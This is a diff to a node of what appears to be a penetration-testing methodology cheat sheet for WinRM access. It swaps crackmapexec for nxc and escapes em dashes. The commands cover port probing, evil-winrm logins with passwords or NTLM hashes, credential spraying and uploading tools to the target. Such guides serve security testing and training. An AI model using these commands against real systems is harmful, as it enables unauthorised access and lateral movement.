@@ -3,11 +3,11 @@
   "phase": "WINDOWS",
   "title": "WinRM (5985/5986)",
   "body": "WinRM is evil-winrm's playground. If you have creds or an NTLM hash for a user in the Remote Management Users group, you have a shell.",
-  "cmd": "nmap -p 5985,5986 -sV $ip\ncurl -s http://$ip:5985/wsman   # 200 = WinRM accessible\n\n# evil-winrm — primary tool\nevil-winrm -i $ip -u administrator -p 'password'\nevil-winrm -i $ip -u 'DOMAIN\\user' -p 'password'\nevil-winrm -i $ip -u administrator -H <NTLM_HASH>\nevil-winrm -i $ip -u administrator -p 'password' -S  # SSL/5986\n\n# Upload/download files in evil-winrm session\nupload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe\ndownload C:\\Users\\admin\\Desktop\\proof.txt\n\n# crackmapexec to test creds\ncrackmapexec winrm $ip -u user -p 'password'\ncrackmapexec winrm $ip -u users.txt -p passwords.txt\ncrackmapexec winrm $ip -u user -H <HASH>\n\n# PowerShell remoting (from Windows)\n$sess = New-PSSession -ComputerName $ip -Credential (Get-Credential)\nEnter-PSSession $sess",
+  "cmd": "nmap -p 5985,5986 -sV $ip\ncurl -s http://$ip:5985/wsman   # 200 = WinRM accessible\n\n# evil-winrm \u2014 primary tool\nevil-winrm -i $ip -u administrator -p 'password'\nevil-winrm -i $ip -u 'DOMAIN\\user' -p 'password'\nevil-winrm -i $ip -u administrator -H <NTLM_HASH>\nevil-winrm -i $ip -u administrator -p 'password' -S  # SSL/5986\n\n# Upload/download files in evil-winrm session\nupload /path/to/tool.exe C:\\Windows\\Temp\\tool.exe\ndownload C:\\Users\\admin\\Desktop\\proof.txt\n\n# nxc to test creds\nnxc winrm $ip -u user -p 'password'\nnxc winrm $ip -u users.txt -p passwords.txt\nnxc winrm $ip -u user -H <HASH>\n\n# PowerShell remoting (from Windows)\n$sess = New-PSSession -ComputerName $ip -Credential (Get-Credential)\nEnter-PSSession $sess",
   "warn": "User must be in 'Remote Management Users' or 'Administrators' group. WinRM is usually enabled on domain-joined machines.",
   "choices": [
     {
-      "label": "Got WinRM shell — start privesc",
+      "label": "Got WinRM shell \u2014 start privesc",
       "next": "windows_post_exploit"
     },
     {
@@ -15,7 +15,7 @@
       "next": "bruteforce"
     },
     {
-      "label": "Have hash — Pass the Hash",
+      "label": "Have hash \u2014 Pass the Hash",
       "next": "pth"
     }
   ]
